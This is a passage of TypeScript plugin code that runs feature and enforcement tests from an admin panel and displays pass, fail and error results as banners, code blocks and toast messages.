				fields: Object.entries(results).map(([id, r]) => ({
					label: `${r.passed ? "PASS" : "FAIL"} ${id}`,
					value: r.message,
				})),
			},
		],
		toast: {
			message: allPassed ? "All feature tests passed" : `${total - passCount} test(s) failed`,
			type: allPassed ? "success" : "error",
		},
	};
}

async function runSingleTestAdmin(ctx: PluginContext, testId: string) {
	const runner = enforcementRunners[testId] ?? featureRunners[testId];
	if (!runner) {
		return {
			blocks: [{ type: "banner", style: "error", text: `Unknown test: ${testId}` }],
			toast: { message: `Unknown test: ${testId}`, type: "error" },
		};
	}

	try {
		const result = await runner(ctx);
		return {
			blocks: [
				{
					type: "banner",
					style: result.passed ? "success" : "error",
					text: `${result.passed ? "PASS" : "FAIL"}: ${result.message}`,
				},
				...(result.details ? [{ type: "code", code: result.details, language: "jsonc" }] : []),
			],
			toast: {
				message: `${testId}: ${result.passed ? "passed" : "failed"}`,
				type: result.passed ? "success" : "error",
			},
		};
	} catch (e) {
		const msg = e instanceof Error ? e.message : String(e);
		return {
			blocks: [{ type: "banner", style: "error", text: `Error: ${msg}` }],
			toast: { message: `${testId} errored`, type: "error" },
		};
	}
}
